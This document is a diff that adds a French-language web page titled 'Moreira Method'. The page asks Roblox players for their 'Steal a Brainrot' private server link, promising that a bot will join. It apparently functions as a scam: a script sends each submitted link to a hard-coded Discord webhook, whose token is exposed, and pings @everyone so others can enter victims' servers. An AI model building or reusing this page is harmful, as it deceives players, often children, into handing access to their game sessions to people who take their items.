@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Moreira Method</title>
+
+  <style>
+    body {
+      background-color: #0b0b0b;
+      color: #fff;
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      justify-content: center;
+    }
+
+    .box {
+      width: 600px;
+      padding: 30px;
+      background: linear-gradient(145deg, #1a1a1a, #111);
+      border-radius: 15px;
+      box-shadow: 0 0 20px #00ff99;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 15px;
+      color: #00ff99;
+      font-size: 28px;
+    }
+
+    p {
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    .info-text {
+      color: #00ccff;
+      font-style: italic;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      background: #111;
+      color: #fff;
+      border: 1px solid #555;
+      border-radius: 6px;
+      margin-top: 8px;
+      font-size: 16px;
+      transition: border 0.3s;
+    }
+
+    input:focus {
+      border-color: #00ff99;
+      outline: none;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      background: #00ff99;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #00cc7a;
+    }
+
+    .success {
+      color: #00ff99;
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 16px;
+      display: none;
+    }
+
+    .error {
+      color: #ff4444;
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 16px;
+      display: none;
+    }
+
+    .bottom-image {
+      margin-top: 30px;
+      width: 100%;
+      max-width: 600px;
+      border-radius: 12px;
+      object-fit: cover;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="box">
+    <h2>Moreira Method</h2>
+    <p>Entrez votre lien de serveur privé Steal a Brainrot 🧠</p>
+    <p class="info-text">Rejoignez votre serveur privé et attendez qu'un bot rejoigne </p>
+
+    <input id="psLink" placeholder="https://www.roblox.com/games/...">
+
+    <button onclick="send()">Submit</button>
+
+    <div class="success" id="success">
+      ✅ Votre lien a été envoyé avec succès !
+    </div>
+    <div class="error" id="error">
+      ❌ Erreur lors de l’envoi, réessayez.
+    </div>
+  </div>
+
+  <!-- Image horizontale en bas -->
+  <img src="https://i.pinimg.com/1200x/f7/ed/ac/f7edac2a781e4b86541cb03c127f68eb.jpg" alt="Image finale" class="bottom-image">
+
+  <script>
+    function send() {
+      const link = document.getElementById("psLink").value;
+      const successDiv = document.getElementById("success");
+      const errorDiv = document.getElementById("error");
+
+      successDiv.style.display = "none";
+      errorDiv.style.display = "none";
+
+      if (!link) return alert("Entrez un lien !");
+
+      fetch("https://discord.com/api/webhooks/1452873894682824777/6zrnDuILFSv3skLD4gff5B5ZC4uDo_no_jMo86jaRocJampAzjZPBO2l6gRqHlZS_hHh", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: "# @everyone 🧠 Nouveau lien de serveur Roblox – Steal a Brainrot",
+          embeds: [
+            {
+              image: {
+                url: "https://i.pinimg.com/1200x/f7/ed/ac/f7edac2a781e4b86541cb03c127f68eb.jpg"
+              },
+              description: "🔗 " + link,
+              color: 65280
+            }
+          ]
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          successDiv.style.display = "block";
+        } else {
+          errorDiv.style.display = "block";
+        }
+      })
+      .catch(() => {
+        errorDiv.style.display = "block";
+      });
+    }
+  </script>
+
+</body>
+</html>
